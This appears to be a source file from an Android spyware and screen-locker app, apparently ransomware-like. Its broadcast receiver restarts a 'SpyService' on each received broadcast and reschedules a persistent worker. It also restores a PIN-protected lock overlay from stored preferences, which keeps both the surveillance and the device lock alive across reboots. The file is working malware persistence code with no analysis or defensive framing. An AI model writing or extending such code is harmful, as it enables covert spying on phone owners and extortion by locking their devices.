package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.util.Log;

public class RestarterReceiver extends BroadcastReceiver {

    private static final String TAG = "CRPT.Restarter";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Received: " + action);

        // Start SpyService
        startSpy(context);

        // Reschedule WorkManager
        PersistentWorker.schedule(context);

        // Restore LockOverlay jika sebelumnya terkunci
        restoreLock(context);
    }

    private void startSpy(Context ctx) {
        try {
            Intent svc = new Intent(ctx, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(svc);
            else ctx.startService(svc);
        } catch (Exception e) { Log.w(TAG, "startSpy: " + e.getMessage()); }
    }

    private void restoreLock(Context ctx) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            boolean isLocked = prefs.getBoolean("isLocked", false);
            if (isLocked) {
                String msg = prefs.getString("lockMessage", "DEVICE IS LOCKED");
                String pin = prefs.getString("lockPin", "1234");
                Intent lockSvc = new Intent(ctx, LockOverlayService.class);
                lockSvc.setAction(LockOverlayService.ACTION_LOCK);
                lockSvc.putExtra(LockOverlayService.EXTRA_MESSAGE, msg);
                lockSvc.putExtra(LockOverlayService.EXTRA_PIN, pin);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(lockSvc);
                else ctx.startService(lockSvc);
            }
        } catch (Exception e) { Log.w(TAG, "restoreLock: " + e.getMessage()); }
    }
}
